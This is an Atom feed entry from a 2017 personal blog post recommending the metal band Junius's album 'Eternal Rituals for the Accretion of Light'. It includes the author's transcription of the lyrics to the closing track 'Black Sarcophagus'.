rel="alternate" type="text/html" title="Becoming a Metaphysician" /><published>2017-08-16T23:40:00-05:00</published><updated>2017-08-16T23:40:00-05:00</updated><id>/music/2017/08/16/becoming-a-metaphysician</id><content type="html" xml:base="/music/2017/08/16/becoming-a-metaphysician.html">&lt;h2 id=&quot;breathe-out-breathe-in&quot;&gt;Breathe out, Breathe in&lt;/h2&gt;
&lt;p&gt;I really need to get around to typing up some notes I want to digitize from some recent events.  Particularly, beer making and homelab crap.  Time, truly the most precious commodity.&lt;/p&gt;

&lt;p&gt;Maybe this weekend!&lt;/p&gt;

&lt;p&gt;I just had to post something quick about a new band I found named Junius.&lt;br /&gt;
I subscribe to &lt;a href=&quot;https://www.decibelmagazine.com&quot;&gt;Decibel&lt;/a&gt;, which I recommend for anyone who has moved beyond the glory days that consisted
of massive amounts of free time and very little responsibility.  Those days are behind me now for sure, and Decibel is my go-to for keeping up with the metal scene 
other than a key friend who is still living his glory days.&lt;/p&gt;

&lt;p&gt;Decibel had a review for the new Junius album &lt;em&gt;Eternal Rituals for the Accretion of Light&lt;/em&gt;.  I believe they gave it a 8 or 9 out of 10. The album is so damn good and 
it’s basically been on repeat for me the last month or so.  Highly recommend you click &lt;a href=&quot;https://www.youtube.com/watch?v=tv_yKPChhq4&quot;&gt;here&lt;/a&gt; and check out the song &lt;em&gt;Mass for Metaphysicians&lt;/em&gt;. 
The theme throughout the album regarding the path to transcendence only adds to the enjoyment of the music itself.  I think this will be one of my top 2017 albums for sure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://f4.bcbits.com/img/a1160145689_16.jpg&quot; alt=&quot;img&quot; title=&quot;Eternal Rituals&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I took a stab at the lyrics to &lt;a href=&quot;https://www.youtube.com/watch?v=gpSsLb59B1o&quot;&gt;&lt;em&gt;Black Sarcophagus&lt;/em&gt;&lt;/a&gt; below which ends the album (probably my favorite track) and speaks to the existentialism tone throughout the album.&lt;/p&gt;

&lt;p&gt;The lyrical content makes me think of Fear Factory or Meshuggah’s brand of constantly improving thyself.  Where as Fear Factory and Meshuggah go the route of a more cyborg-like reconstruction to the self in order to improve, Junius speaks more to spiriual transcendence by stepping beyond the physical realm.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Seal the room
Light the fire
Burning clothes
The energy starts to flow

I am what I've learned
I meditate
My body shakes
The room starts to glow

Pouring over me
Higher frequencies
The final hour of the pain I'll devour

The bearer of light
The primal tones
Take my flesh and let me go

The final march
The seventh step
The death of this dream has come

All I have loved
All I have held
Has led to this sea of one

All I have loved
All I have held
Has led to this song of souls

Send me up now
Send me up now
Send me up now
I'm ready for time to die
I'm ready for infinite eyes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>wittr</name></author><category term="music" /><summary type="html">Breathe out, Breathe in I really need to get around to typing up some notes I want to digitize from some recent events. Particularly, beer making and homelab crap. Time, truly the most precious commodity. Maybe this weekend! I just had to post something quick about a new band I found named Junius. I subscribe to Decibel, which I recommend for anyone who has moved beyond the glory days that consisted of massive amounts of free time and very little responsibility. Those days are behind me now for sure, and Decibel is my go-to for keeping up with the metal scene other than a key friend who is still living his glory days. Decibel had a review for the new Junius album Eternal Rituals for the Accretion of Light. I believe they gave it a 8 or 9 out of 10. The album is so damn good and it’s basically been on repeat for me the last month or so. Highly recommend you click here and check out the song Mass for Metaphysicians. The theme throughout the album regarding the path to transcendence only adds to the enjoyment of the music itself. I think this will be one of my top 2017 albums for sure. I took a stab at the lyrics to Black Sarcophagus below which ends the album (probably my favorite track) and speaks to the existentialism tone throughout the album. The lyrical content makes me think of Fear Factory or Meshuggah’s brand of constantly improving thyself. Where as Fear Factory and Meshuggah go the route of a more cyborg-like reconstruction to the self in order to improve, Junius speaks more to spiriual transcendence by stepping beyond the physical realm. Seal the room Light the fire Burning clothes The energy starts to flow I am what I've learned I meditate My body shakes The room starts to glow Pouring over me Higher frequencies The final hour of the pain I'll devour The bearer of light The primal tones Take my flesh and let me go The final march The seventh step The death of this dream has come All I have loved All I have held Has led to this sea of one All I have loved All I have held Has led to this song of souls Send me up now Send me up now Send me up now I'm ready for time to die I'm ready for infinite eyes</summary></entry></feed>